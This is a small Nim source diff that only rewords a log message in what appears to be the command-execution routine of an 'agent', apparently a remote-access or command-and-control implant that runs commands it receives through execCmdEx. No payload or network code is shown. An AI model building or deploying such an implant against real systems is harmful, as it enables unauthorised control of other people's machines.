@@ -44,7 +44,7 @@ when defined(agent):
             else:  
                 discard 
 
-            echo fmt"   [>] Executing: {command} {arguments}."
+            echo fmt"   [>] Executing command: {command} {arguments}"
 
             let (output, status) = execCmdEx(fmt("{command} {arguments}")) 
 
